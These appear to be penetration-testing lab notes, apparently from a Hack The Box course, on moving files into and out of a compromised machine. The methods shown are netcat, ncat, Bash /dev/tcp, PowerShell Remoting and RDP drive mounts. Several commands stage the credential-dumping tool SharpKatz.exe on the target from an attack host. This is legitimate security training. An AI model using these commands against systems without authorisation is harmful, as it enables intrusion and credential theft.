
#### Ncat - Compromised Machine - Listening on Port 8000

```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Netcat - Attack Host - Sending File to Compromised machine

```shell-session
HrithikManoj000@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
HrithikManoj000@htb[/htb]$ # Example using Original Netcat
HrithikManoj000@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

> Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

> If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## PowerShell Session File Transfer

> Can be useful in scenario's where SMB, HTTP or HTTPS are unavailable. If that's the case, we can use **PowerShell Remoting**, aka WinRM, to perform file transfer operations.

- `Requires Administrative Access/ Be a member of the Remote Management Users group/ have explicit permissions for PowerShell Remoting in the session configuration.`
- Powershell remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
- Originally designed to manage remote computers in  a network.
- By default enabling this feature creates an HTTP and HTTPS listner. 
- Runs on ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

### Example scenario
- Imagine that we have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
-
**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01**

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
- Note that we already have privileges over DATABASE01, we don't need to specify credentials.

 **Create a PowerShell Remoting Session to DATABASE01**


```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

- We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

 **Copy DATABASE.txt from DATABASE01 Session to our Localhost**

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


## RDP

- Used in windows networks for remote access.
- Can be used to transfer files by copying and pasting.
- xfreerdp and rdesktop are the common tools on linux which we can use to connect to an rdp session.
- As an alternative to copying and pasting, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop'

```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

- To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
- Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
